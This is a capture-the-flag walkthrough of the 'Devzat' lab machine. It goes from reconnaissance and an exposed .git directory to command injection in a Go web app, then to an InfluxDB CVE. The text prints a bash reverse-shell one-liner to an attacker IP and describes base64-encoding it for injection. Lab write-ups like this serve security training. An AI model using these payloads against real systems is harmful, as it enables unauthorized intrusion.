=== Nmap ===

From the nmap results, we can see that this is a webserver with an unidentified app on port 8000.
Based on the scan on port 8000, it seems to be using a go library called [[https://github.com/karfield/ssh2go|ssh2go]]

=== Website - [[http://devzat.htb]] ===

Initial scanning shows the box has a website up. Trying to navigate to the website redirects us to
[[http://devzat.htb]]. After updating our /etc/hosts, we are able to see the webpage.

{{{class="nohighlight"
trent@TMDeal-kali[Devzat]$ cat /etc/hosts
10.10.14.1    devzat.htb
}}}

{{local:../images/devzat/website/homepage.png|http://devzat.htb Homepage}}

Not much about the site itself is interesting. However, there is a message at the bottom informing
the reader that they are invited to try out their chat app.

{{local:../images/devzat/website/chat_app_start_instructions.png|Chat app usage}}

When running the instructed command, you may receive an error about no matching host key type. This
error can be resolved by adding a few lines to ~/.ssh/config

{{{class="nohighlight"
Host devzat.htb
	HostName devzat.htb
	User dev
	PubkeyAcceptedAlgorithms +ssh-rsa
	HostkeyAlgorithms +ssh-rsa
}}}

Then we can run the command to gain access to the chat app

{{local:../images/devzat/chat_app/initial_connection.png|Initial Connection}}

=== Chat App First Look ===

With just the basic level of access we have, there is not much that can be done with the app right
now. We will come back to this at a later point

=== Subdomin - [[http://pets.devzat.htb]] ===

Taking a look back at port 80, since we needed to add an entry to /etc/hosts, it may be worthwhile
to scan for subdomains. We will scan for subdomains using Gobuster.

{{local:../images/devzat/website/pets/gobuster_subdomain_discovery.png|Pets Subdomain Discovery}}

Our scan finds one valid subdomain at [[http://pets.devzat.htb]] The homepage is an incomplete CRUD
app.

{{local:../images/devzat/website/pets/homepage.png|http://pets.devzat.htb Homepage}}

The most that can be done is adding a pet to the pet inventory, but its not hooked up to a database
so nothing saves. Running Gobuster to find other endpoints shows that [[http://pets.devzat.htb/.git/]]
is publicly readable. We can grab the contents of the folder with
[[https://pypi.org/project/git-dumper/|git-dumper]], but we can also just download the directory
with a tool like wget.

This is probably the source code for the pets web application. Inside of main.go, there is a line
where that takes out input without sanitizing it and passes it to `exec.Command`. This means we can
inject our own commands into this command and gain remote code execution

{{local:../images/devzat/git/main_execs_sh.png|Call to exec.Command}}

== Shell as Patrick ==

To test if we can properly execute code, we will just see if we can get the contents of /etc/passwd

{{local:../images/devzat/git/burp_payload.png|Burp Payload}}
{{local:../images/devzat/git/dumping_etc_passwd.png|Contents of /etc/passwd}}

Now that we now we can actually exploit this, we can execute a callback to a netcat listener.

We base64 encrypt the command `bash -i >& /dev/tcp/10.10.14.7/4444 0>&1` and then decrypt and
execute it in a one liner. This is done to avoid messing up the payload with special characters like
`"` or `'`.

{{local:../images/devzat/git/rce_request.png|Sending the request with Burp}}
{{local:../images/devzat/shell_as_patrick.png|Shell as Patrick}}

From there, we can grab Patrick's ssh key for a better shell experience

{{local:../images/devzat/shell_as_patrick_ssh.png}}

== Shell as Catherine ==

=== Interesting ports ===

After running linpeas, we can see that there are some ports that are open locally that we could not
previously access

{{local:../images/devzat/linpeas/active_ports.png}}

Right now, we do not know what these ports do, so we will look around some more.

=== Patrick Chat Log ===

We can see Patrick's chat log in their app by logging into it while logged into the machine

{{local:../images/devzat/patrick_chat_log.png}}

Looking up info on Influxdb shows that it runs on port 8086 by default. We can check the version of
Influxdb running by making a HEAD request with curl on port 8086

{{local:../images/devzat/influxdb/influxdb_version.png}}

Looking up "Influxdb 1.7.5" on google shows results for
[[https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933|CVE-2019-20933]].
